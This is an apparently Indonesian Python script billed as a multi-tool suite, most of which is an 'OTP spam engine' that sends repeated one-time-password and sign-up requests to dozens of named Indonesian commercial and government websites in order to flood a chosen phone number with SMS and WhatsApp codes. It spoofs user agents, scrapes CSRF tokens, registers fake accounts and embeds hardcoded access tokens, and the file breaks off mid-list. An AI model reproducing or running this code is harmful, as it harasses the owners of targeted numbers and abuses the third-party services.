#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ================================================================
#  ZEVXX TOOLS MEGA - DRAGON EDITION
#  by ZEVXX | 22 Tools | Role System | Animasi Keren
# ================================================================

import os, sys, time, json, uuid, random, string, re, socket, threading, subprocess, smtplib, hashlib, base64, urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ================================================================
# KONFIGURASI
# ================================================================
OWNER_ID = "123456789"
USERS_FILE = "users.json"
TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT_TELEGRAM"
EMAIL_SENDER = "emailkamu@gmail.com"
EMAIL_PASSWORD = "app_password_gmail"
NUMVERIFY_API_KEY = "isi_api_key_numverify"

# ================================================================
# COLOR
# ================================================================
class Color:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'; BLUE = '\033[94m'
    CYAN = '\033[96m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'; RESET = '\033[0m'
    BOLD = '\033[1m'; DIM = '\033[2m'; GOLD = '\033[33m'; ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;205m'; NEON = '\033[38;5;51m'; GLITCH = '\033[38;5;201m'
    LIME = '\033[38;5;118m'; PURPLE = '\033[38;5;129m'

def clear(): os.system('clear' if os.name == 'posix' else 'cls')

# ================================================================
# BANNER
# ================================================================
def dragon_banner():
    clear()
    dragon = f"""
{Color.GLITCH}            __====-_  _-====___
{Color.GLITCH}   _--^^^#####//      \\\\#####^^^--_
{Color.GLITCH} _-^##########// (    ) \\\\##########^-_
{Color.GLITCH}-############//  |\\^^/|  \\\\############-
{Color.GLITCH}_/############//   (@::@)   \\\\############\\_
{Color.GLITCH}/#############((     \\\\//     ))#############\\
{Color.GLITCH}-###############\\\\    (oo)    //###############-
{Color.GLITCH}-#################\\\\  / VV \\  //#################-
{Color.GLITCH}-###################\\\\/      \\//###################-
{Color.GLITCH}_#/|##########/\\######(   /\\   )######/\\##########|\\#_
{Color.GLITCH}|/ |#/\\#/\\#/\\/  \\#/\\##\\  |  |  /##/\\#/  \\/\\#/\\#/\\#| \\
{Color.GLITCH}`  |/  V  V  `   V  \\#\\| |  | |/#/  V   '  V  V  \\|
{Color.GLITCH}   `   `  `      `   / | |  | | \\   '      '  '   `
{Color.GLITCH}                    (  | |  | |  )
{Color.GLITCH}                   __\\ | |  | | /__
{Color.GLITCH}                  (vvv(VVV)(VVV)vvv)
{Color.NEON}
{Color.NEON}  ╔═══════════════════════════════════════════════════════════╗
{Color.NEON}  ║  {Color.GOLD}🐉 ZEVXX TOOLS MEGA - DRAGON EDITION 🐉{Color.NEON}                ║
{Color.NEON}  ║  {Color.PINK}by ZEVXX • 22 Tools • Multi-Role • Animasi Keren{Color.NEON}    ║
{Color.NEON}  ╚═══════════════════════════════════════════════════════════╝
{Color.RESET}
"""
    print(dragon)

# ================================================================
# ANIMASI
# ================================================================
def typing_effect(text, delay=0.03):
    for char in text:
        sys.stdout.write(char); sys.stdout.flush(); time.sleep(delay)
    print()

def matrix_rain(duration=1.5):
    cols = os.get_terminal_size().columns // 2
    for _ in range(int(duration * 8)):
        line = ''.join(random.choice(['0', '1']) for _ in range(cols))
        color = random.choice([Color.GREEN, Color.CYAN, Color.LIME])
        sys.stdout.write(f'\r{color}{line}{Color.RESET}'); sys.stdout.flush(); time.sleep(0.06)
    print('\r' + ' ' * os.get_terminal_size().columns + '\r', end='')

def spinner(text="Loading", duration=2):
    chars = ['◐','◓','◑','◒']; colors = [Color.NEON, Color.GOLD, Color.PINK, Color.CYAN]
    end = time.time() + duration; i = 0
    while time.time() < end:
        color = colors[i % len(colors)]
        sys.stdout.write(f'\r{color}🌀 {chars[i % len(chars)]} {text}...{Color.RESET}')
        sys.stdout.flush(); time.sleep(0.1); i += 1
    print('\r' + ' ' * 60 + '\r', end='')

def progress_bar(current, total, text="Progress"):
    percent = int((current / total) * 100)
    bar_length = 30
    filled = int(bar_length * percent / 100)
    bar = "█" * filled + "░" * (bar_length - filled)
    color = Color.NEON if percent < 30 else Color.GOLD if percent < 70 else Color.PINK
    sys.stdout.write(f'\r{color}📊 {text}: {Color.CYAN}[{bar}]{Color.RESET} {color}{percent}%{Color.RESET}')
    sys.stdout.flush()

def rocket_launch():
    frames = ["  🚀     ", "  🚀🔥   ", "  🚀🔥🔥 ", "  🚀🔥🔥🔥", "  💥🔥🔥🔥", "  ✨💥💥 ", "  ✨✨💥  ", "  ✨✨✨  "]
    for frame in frames:
        sys.stdout.write(f'\r{Color.ORANGE}{frame}{Color.RESET}'); sys.stdout.flush(); time.sleep(0.12)
    print('\r' + ' ' * 20 + '\r', end='')
    for i in range(3):
        sys.stdout.write(f'\r{Color.YELLOW}💨 ' * (i+1) + ' ' * 20); sys.stdout.flush(); time.sleep(0.1)
    print('\r' + ' ' * 30 + '\r')

def glitch_effect(text):
    for _ in range(3):
        sys.stdout.write(f'\r{Color.GLITCH}{text}{Color.RESET}'); sys.stdout.flush(); time.sleep(0.05)
        sys.stdout.write(f'\r{Color.NEON}{text}{Color.RESET}'); sys.stdout.flush(); time.sleep(0.05)
    print()

# ================================================================
# MANAJEMEN USER
# ================================================================
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f: return json.load(f)
    return {"users": {}}
def save_users(data):
    with open(USERS_FILE, 'w') as f: json.dump(data, f, indent=4)
def add_user(user_id, name, role):
    data = load_users(); data['users'][str(user_id)] = {"name": name, "role": role}; save_users(data)
def remove_user(user_id):
    data = load_users()
    if str(user_id) in data['users']:
        del data['users'][str(user_id)]; save_users(data); return True
    return False
def get_user_role(user_id):
    data = load_users(); user = data['users'].get(str(user_id))
    return user['role'] if user else None
def get_user_name(user_id):
    data = load_users(); user = data['users'].get(str(user_id))
    return user['name'] if user else "Unknown"
def list_users(): return load_users()['users']

# ================================================================
# LOGIN
# ================================================================
def login():
    dragon_banner()
    print(f"{Color.GOLD}┌─ {Color.BOLD}🔐 LOGIN SYSTEM{Color.RESET}")
    print(f"{Color.GOLD}│  Masukkan User ID (angka) atau ketik 'register' untuk daftar{Color.RESET}")
    print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────{Color.RESET}")
    matrix_rain(1.0)
    user_input = input(f"\n{Color.NEON}┌─ {Color.BOLD}User ID{Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
    if user_input.lower() == "register":
        spinner("Membuka formulir registrasi", 1.0)
        new_id = input("Masukkan ID baru (angka): ").strip()
        if not new_id.isdigit():
            print(f"{Color.RED}ID harus angka!{Color.RESET}"); return None
        name = input("Masukkan nama: ").strip()
        add_user(new_id, name, "user")
        glitch_effect(f"✅ User {name} berhasil didaftarkan dengan role 'user'")
        time.sleep(0.5); return new_id
    else:
        if not user_input.isdigit():
            print(f"{Color.RED}ID harus angka!{Color.RESET}"); return None
        role = get_user_role(user_input)
        if role is None:
            print(f"{Color.RED}User tidak ditemukan. Silakan register terlebih dahulu.{Color.RESET}"); return None
        name = get_user_name(user_input)
        spinner(f"Login sebagai {name} ({role})", 1.2)
        rocket_launch()
        typing_effect(f"{Color.GREEN}Selamat datang, {name} ({role}){Color.RESET}")
        return user_input

# ================================================================
# ============ OTP SPAM ENGINE BARU (38 TARGETS) ================
# ================================================================
def get_ua():
    return random.choice([
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/120.0.6099.230",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0"
    ])

def rnd_name(): return ''.join(random.choices(string.ascii_letters, k=8)).capitalize()
def rnd_email(): return rnd_name().lower() + str(random.randint(100, 999)) + "@gmail.com"
def rnd_pw(): return 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1'
def _digits(p): return ''.join(c for c in str(p) if c.isdigit())

def fmt_08(p):
    p = _digits(p)
    if p.startswith('62'): return '0' + p[2:]
    if p.startswith('8'): return '0' + p
    return p
def fmt_62(p):
    p = _digits(p)
    if p.startswith('0'): return '62' + p[1:]
    return p if p.startswith('62') else '62' + p
def fmt_plus_v2(p):
    p = _digits(p)
    if p.startswith('0'): return '+62' + p[1:]
    if p.startswith('62'): return '+' + p
    return '+62' + p
def fmt_nocode(p):
    p = _digits(p)
    if p.startswith('0'): return p[1:]
    if p.startswith('62'): return p[2:]
    return p
def fmt_phone_only(p): return fmt_08(p)

# -------- CUSTOM HANDLERS (untuk post_type khusus) --------
def custom_multipart(target, num, ctx):
    """Optik Melawai - multipart form-data"""
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="phone"\r\n\r\n{num}\r\n'
            f"--{boundary}--\r\n")
    headers = {**target['headers'], 'Content-Type': f'multipart/form-data; boundary={boundary}'}
    return requests.post(target['url'], headers=headers, data=body, timeout=10)

def custom_resend_otp(target, num, ctx):
    """Holland Bakery - form-urlencoded"""
    headers = {**target['headers']}
    return requests.post(target['url'], headers=headers, data={'phone': num}, timeout=10)

def custom_hashmicro(target, num, ctx):
    """Hash Micro - form-urlencoded"""
    headers = {**target['headers'], 'User-Agent': get_ua()}
    data = {'phone': num, 'name': rnd_name(), 'email': rnd_email()}
    return requests.post(target['url'], headers=headers, data=data, timeout=10)

def custom_tuneup(target, num, ctx):
    """TuneUp - multipart-ish mitra register"""
    headers = {
        "Origin": "https://dashboard.tuneup.id",
        "Referer": "https://dashboard.tuneup.id/",
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
    }
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    data = {
        "company_name": "PT " + name.capitalize(),
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": num,
        "province_code": "32", "city_code": "32.04",
        "subscription_id": "undefined", "channel": "whatsapp",
        "agreement": "true", "service_categories[]": "3",
    }
    return requests.post(target['url'], data=data, headers=headers, timeout=10)

def custom_ultramilk(target, num, ctx):
    headers = {
        "Host": "ultramilk-clp.kata.ai",
        "authorization": "Bearer undefined",
        "user-agent": get_ua(),
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://www.icownicpatch.com",
        "referer": "https://www.icownicpatch.com/",
    }
    payload = {
        "name": rnd_name(), "email": rnd_email(), "password": rnd_pw(),
        "phone_number": num, "portal": "IcownicPatch", "is_consent": True
    }
    return requests.post(target['url'], json=payload, headers=headers, timeout=10)

def custom_kaniva(target, num, ctx):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_ua()})
    try:
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=10)
    except Exception:
        return None
    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if m: csrf = m.group(1)
    if not csrf:
        raw = sess.cookies.get("XSRF-TOKEN", "")
        if raw: csrf = urllib.parse.unquote(raw)
    if not csrf: return None
    headers = {
        "X-XSRF-TOKEN": csrf, "X-Inertia": "true",
        "X-Inertia-Version": "56e6482206af61d5490c1118b2876044",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
        "Origin": "https://daftar.kanivainternationalbali.com",
        "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp",
        "Accept": "application/json", "User-Agent": get_ua(),
    }
    return sess.post(target['url'], json={"name": rnd_name(), "phone": num}, headers=headers, timeout=10)

def custom_jembatani(target, num, ctx):
    headers = {
        "Host": "api.jembatani.co.id",
        "authorization": "Bearer 4aa440574d1da1687276e697495154499b6eaf6142eaaef007271fcd840aca98",
        "user-agent": get_ua(),
        "content-type": "application/json",
        "origin": "https://jembatani.co.id",
        "referer": "https://jembatani.co.id/",
    }
    name = rnd_name(); pw = rnd_pw()
    reg = {"phone_number": num, "name": name, "role": "farmer",
           "password": pw, "password_confirmation": pw, "consent": "1"}
    try:
        r = requests.post("https://api.jembatani.co.id/v1/register", json=reg, headers=headers, timeout=10)
        if r.status_code == 200 and '"success":true' in r.text: return r
    except Exception: pass
    return requests.post("https://api.jembatani.co.id/v1/regenerate-otp",
                         json={"phone_number": num}, headers=headers, timeout=10)

def custom_rcx(target, num, ctx):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_ua()})
    try:
        r = sess.get("https://sso.rcx.co.id/register", timeout=10)
    except Exception: return None
    token = None
    if "XSRF-TOKEN" in sess.cookies:
        token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
    if not token:
        m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
        if m: token = m.group(1)
    if not token: return None
    headers = {
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://sso.rcx.co.id",
        "Referer": "https://sso.rcx.co.id/register",
        "User-Agent": get_ua(),
    }
    data = {"_token": token, "mode": "register", "channel": "whatsapp",
            "name": rnd_name(), "email": rnd_email(), "identifier": num}
    return sess.post(target['url'], headers=headers, data=data, allow_redirects=False, timeout=10)

def custom_sahabatteknisi(target, num, ctx):
    headers = {
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_ua(),
        "content-type": "application/json",
        "origin": "https://www.sahabatteknisi.co.id",
        "referer": "https://www.sahabatteknisi.co.id/checkout/confirm",
    }
    return requests.post(target['url'], json={"phone": num}, headers=headers, timeout=10)

def custom_99co(target, num, ctx):
    token = ("eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjIt"
             "NnE5bWNleHJHcFdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoi"
             "MWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45"
             "OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0"
             "IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIn0.abc")
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Origin": "https://www.99.co",
        "Referer": "https://www.99.co/id",
        "User-Agent": get_ua(),
    }
    return requests.post(target['url'], json={"brand": "99id", "destination_address": num, "type_id": 2},
                         headers=headers, timeout=10)

def custom_auto2000(target, num, ctx):
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://auto2000.co.id",
        "Referer": "https://auto2000.co.id/login",
    }
    return requests.post(target['url'],
        json={"phoneNumber": num, "isCheckOtpLimit": True, "uniqueID": num, "isLogin": False},
        headers=headers, timeout=10)

def custom_belirumahco(target, num, ctx):
    headers = {
        "User-Agent": get_ua(),
        "Content-Type": "application/json",
        "Origin": "https://belirumah.co",
        "Referer": "https://belirumah.co/",
    }
    return requests.post(target['url'], json={"phone_number": num}, headers=headers, timeout=10)

def custom_fastworkid(target, num, ctx):
    headers = {
        "User-Agent": get_ua(),
        "Content-Type": "application/json",
        "Origin": "https://fastwork.id",
        "Referer": "https://fastwork.id/",
    }
    return requests.post(target['url'], json={"phone_number": num}, headers=headers, timeout=10)

def custom_astra_daihatsu(target, num, ctx):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_ua(),
                         "Origin": "https://www.astra-daihatsu.id",
                         "Referer": "https://www.astra-daihatsu.id/register"})
    try:
        r = sess.get("https://www.astra-daihatsu.id/register", timeout=10)
    except Exception: return None
    csrf = None
    for pat in [r'<meta\s+name="csrf-token"\s+content="([^"]+)"',
                r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"',
                r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}']:
        m = re.search(pat, r.text)
        if m:
            csrf = m.group(0) if pat.endswith('}') else m.group(1)
            break
    if not csrf: csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"
    headers = {**target['headers'], "csrftoken": csrf}
    return sess.post(target['url'], headers=headers, json={"phoneNo": num}, timeout=10)

def custom_royal_canin(target, num, ctx):
    sess = requests.Session()
    sess.headers.update({"Host": "club.royalcanin.id", "User-Agent": get_ua(),
                         "content-type": "application/json",
                         "origin": "https://club.royalcanin.id"})
    payload = {"params": {"Email": "", "mobile_number": num, "OTPType": "IM"}}
    return sess.post(target['url'], json=payload, timeout=10)

def custom_watsons(target, num, ctx):
    headers = {
        "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "user-agent": get_ua(),
        "content-type": "application/json",
        "origin": "https://www.watsons.co.id",
        "referer": "https://www.watsons.co.id/",
    }
    payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": num, "type": "WHATSAPP"}
    return requests.post(target['url'], headers=headers, json=payload, timeout=10)

def custom_hrsbre(target, num, ctx):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_ua()})
    try:
        r = sess.get("https://career.hrs-bre.site/auth/sign_up", timeout=10)
        if r.status_code != 200: return None
    except Exception: return None
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    nik = ''.join(random.choices(string.digits, k=16))
    pw = "Aa1" + ''.join(random.choices(string.ascii_letters + string.digits, k=7))
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{rnd_email()}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{num}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"
            f"{''.join(random.choices(string.ascii_letters, k=8))}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{pw}\r\n"
            f"--{boundary}--\r\n")
    headers = {"User-Agent": get_ua(),
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Origin": "https://career.hrs-bre.site",
               "Referer": "https://career.hrs-bre.site/auth/sign_up"}
    return sess.post("https://career.hrs-bre.site/auth/sign_up_action",
                     headers=headers, data=body, timeout=10)

def custom_erafone(target, num, ctx):
    headers = {
        "Host": "jeanne.eraspace.com", "otp-client": "erafone",
        "User-Agent": get_ua(),
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "otp-provider": "whatsapp",
        "source": "erafone", "device-id": str(uuid.uuid4()),
        "Content-Type": "application/json",
        "sms-client": "erafone", "platform": "erafone-web",
        "Origin": "https://erafone.com", "Referer": "https://erafone.com/",
    }
    return requests.post("https://jeanne.eraspace.com/customers/v2.1/otp/request",
                         headers=headers, json={"identifier": num, "type": "identifier_validation"}, timeout=10)

def custom_beautyhaul(target, num, ctx):
    base = "https://www.beautyhaul.com"
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_ua(),
                         "Content-Type": "application/json",
                         "Origin": base, "Referer": f"{base}/account/register"})
    nd = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    nb = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    email = f"{nd.lower()}{random.randint(100,999)}@gmail.com"
    pw = "Testt#12334"
    reg = {"nama_depan": nd, "nama_belakang": nb, "email": email,
           "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": num,
           "password": pw, "konfirmasi_password": pw,
           "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female","Male"]),
           "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
    try: sess.post(f"{base}/ajax/account/save_register", json=reg, timeout=10)
    except Exception: pass
    return sess.post(f"{base}/ajax/account/send_otp", json={"method": "WhatsApp"}, timeout=10)

def custom_hainaya(target, num, ctx):
    headers = {
        "user-agent": get_ua(), "content-type": "application/json",
        "origin": "https://app.hainaya.id", "referer": "https://app.hainaya.id/onboard",
    }
    prefixes = ['Tst','Coba','Uji','Test','Demo','Sample','Bisnis']
    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    bname = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
    payload = {"business_name": bname, "vertical": "salon", "vendor_type": "nail_salon",
               "business_phone": num, "owner_name": "", "owner_phone": num}
    return requests.post("https://app.hainaya.id/api/onboarding/register",
                         headers=headers, json=payload, timeout=10)

def custom_minumyukkaka(target, num, ctx):
    sess = requests.Session()
    sess.cookies.update({
        "currency": "IDR",
        "_gcl_au": f"1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_gid": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
    })
    fname = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{fname.lower()}{random.randint(100, 999)}@gmail.com"
    pw = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    reg_url = "https://minumyukkaka.com/services/liquid/Register"
    h_reg = {"user-agent": get_ua(), "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
             "origin": "https://minumyukkaka.com", "referer": "https://minumyukkaka.com/register"}
    data = {
        "registerModel[first_name]": fname, "registerModel[last_name]": "",
        "registerModel[email]": email, "registerModel[phone]": num, "registerModel[otp]": "",
        "registerModel[gender]": "", "registerModel[date_of_birth]": "",
        "registerModel[IsAddressRequired]": "false", "registerModel[address]": "",
        "registerModel[additional_address]": "", "registerModel[city]": "",
        "registerModel[zip]": "", "registerModel[country_code]": "", "registerModel[country]": "",
        "registerModel[state]": "", "registerModel[password]": pw, "registerModel[verify_password]": pw,
        "registerModel[pin]": "", "registerModel[verify_pin]": ""
    }
    try: sess.post(reg_url, headers=h_reg, data=data, timeout=10)
    except Exception: pass
    x_sat = sess.cookies.get('x-sat') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
    h_otp = {"user-agent": get_ua(), "x-sat": x_sat,
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
             "origin": "https://minumyukkaka.com", "referer": "https://minumyukkaka.com/register"}
    return sess.post("https://minumyukkaka.com/services/identity/requestOTP",
                     headers=h_otp, data={"destination": num, "otpLength": "6"}, timeout=10)

def custom_sidemang(target, num, ctx):
    email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(100, 999)}@gmail.com"
    headers = {"user-agent": get_ua(), "content-type": "application/json",
               "origin": "https://sidemang.palembang.go.id",
               "referer": "https://sidemang.palembang.go.id/lambidaro/register-otp"}
    return requests.post(target['url'], headers=headers,
                         json={"phoneNumber": num, "email": email}, timeout=10)

def custom_lapormasbup(target, num, ctx):
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json",
               "Origin": "https://lapormasbup.klaten.go.id",
               "Referer": "https://lapormasbup.klaten.go.id/registrasi"}
    name = rnd_name()
    payload = {"name": name, "email": rnd_email(), "mobilephone": num,
               "gender": random.choice(['Laki-Laki', 'Perempuan']),
               "warga_birth_date": f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
               "password": rnd_pw(),
               "address": f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"}
    return requests.post(target['url'], headers=headers, json=payload, timeout=10)

def custom_ptspkemenag(target, num, ctx):
    headers = {"User-Agent": get_ua(), "Content-Type": "application/json",
               "Origin": "https://dev-ptsp.kemenag.go.id",
               "Referer": "https://dev-ptsp.kemenag.go.id/login"}
    digits = ''.join(random.choices(string.digits, k=3))
    letters = ''.join(random.choices(string.ascii_letters, k=3))
    payload = {"nama": rnd_name(), "wa": num, "email": rnd_email(),
               "password": 'Pass' + digits + letters + '$'}
    return requests.post(target['url'], headers=headers, json=payload, timeout=10)

def custom_urlencoded(target, num, ctx):
    body = f"msisdn={num}&otp_type=36&mode=wa"
    headers = {**target['headers'], 'User-Agent': get_ua()}
    return requests.post(target['url'], headers=headers, data=body, timeout=10)

CUSTOM_HANDLERS = {
    'multipart': custom_multipart, 'resend_otp': custom_resend_otp,
    'hashmicro': custom_hashmicro, 'tuneup': custom_tuneup,
    'ultramilk': custom_ultramilk, 'kaniva': custom_kaniva,
    'jembatani': custom_jembatani, 'rcx': custom_rcx,
    'sahabatteknisi': custom_sahabatteknisi, '99co': custom_99co,
    'auto2000': custom_auto2000, 'belirumahco': custom_belirumahco,
    'fastworkid': custom_fastworkid, 'astra_daihatsu': custom_astra_daihatsu,
    'royal_canin': custom_royal_canin, 'watsons': custom_watsons,
    'hrsbre': custom_hrsbre, 'erafone': custom_erafone,
    'beautyhaul': custom_beautyhaul, 'hainaya': custom_hainaya,
    'minumyukkaka': custom_minumyukkaka, 'sidemang': custom_sidemang,
    'lapormasbup': custom_lapormasbup, 'ptspkemenag': custom_ptspkemenag,
    'urlencoded': custom_urlencoded,
}

# -------- DATA-DRIVEN TARGET LIST (38 ENDPOINTS) --------
def _t(name, url, payload_fn, fmt, headers=None, success_on=None, special=None):
    return {'name': name, 'url': url, 'payload_fn': payload_fn, 'fmt': fmt,
            'headers': headers or {}, 'success_on': success_on or [], 'special': special}

TARGETS = [
    # ═══ TIER 1: VERIFIED ═══
    _t('Pinhome',
       'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
       lambda n, c: json.dumps({"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":n}),
       fmt_nocode,
       {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
       ['secretcode']),
    _t('Maulagi', 'https://api.maulagi.id/api/v2/auth/check',
       lambda n, c: json.dumps({"credentials": n}), fmt_08,
       {'Content-Type':'application/json','Origin':'https://maulagi.id','x-ml-key':'C59RUHBU59','Accept':'application/json, text/plain, */*'},
       ['"status":"success"']),
    _t('PlanetBan', 'https://api.planetban.com/website/customer/request-otp',
       lambda n, c: json.dumps({"name":"Test","phone":n,"password":"Test123","purpose":"register","method":"whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://planetban.com'},
       ['status":true','success']),
    _t('Rumah123', 'https://www.rumah123.com/api/otp/request-otp',
       lambda n, c: json.dumps({"cancelledRequestId":c['rand'],"ipAddress":c['ip'],"phoneNumber":n,"portalId":1,"type":"WHATSAPP"}),
       lambda p: p, {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com','base-url-core':'https://www.rumah123.com'},
       ['requestid']),
    _t('Paper', 'https://register.paper.id/api/v1/auth/register/send-otp',
       lambda n, c: json.dumps({"phone":n,"method":"whatsapp","registered_by":"flutter mweb"}),
       lambda p: p, {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
       ['otp']),
    _t('Dunia Games', 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
       lambda n, c: json.dumps({"phoneNumber":n,"userName":c['raw']}),
       fmt_plus_v2, {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
       ['otp']),
    _t('Bunda Hospital', 'https://cms.bunda.co.id/api/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone_number": int(n) if str(n).isdigit() else n, "type":"auth"}),
       lambda p: _digits(p), {'Content-Type':'application/json','Origin':'https://www.bunda.co.id','x-locale':'id'},
       ['otp']),
    _t('Bonus Belanja', 'https://www.bonusbelanja.com/api/auth/registration/app',
       lambda n, c: json.dumps({"phone":n,"name":"User","agreeTnc":True,"agreeContact":True}),
       lambda p: p, {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
       ['error":false']),
    _t('Matahari', 'https://matahari-backend-prod.matahari.com/api/auth/register',
       lambda n, c: json.dumps({"emailAddress":c['email'],"name":c['name'],"mobileCountryCode":"","mobileNumber":n,"birthDate":"2000-01-01","genderId":"1","password":c['pw']}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://matahari.com'},
       ['otp','success','code','already exists']),
    _t('Hijup', 'https://www.hijup.com/sign_in',
       lambda n, c: json.dumps([{"phone_number": n, "store_path": "hijup"}]),
       lambda p: p,
       {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.hijup.com',
        'next-action':'b7eda6e749fbadcfcf226c2e36865091520b679f','next-url':'/sign_in'},
       ['otp','code','success']),
    _t('Alodokter', 'https://www.alodokter.com/resend-otp',
       lambda n, c: json.dumps({"user":{"phone":n,"uuid":c['uuid']},"request_via":"whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://www.alodokter.com',
                'x-csrf-token':'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg=='},
       ['otp','success','code']),
    _t('Blibli Tiket', 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
       lambda n, c: json.dumps({"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":n,"recaptchaToken":""}),
       fmt_plus_v2,
       {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://account.bliblitiket.com',
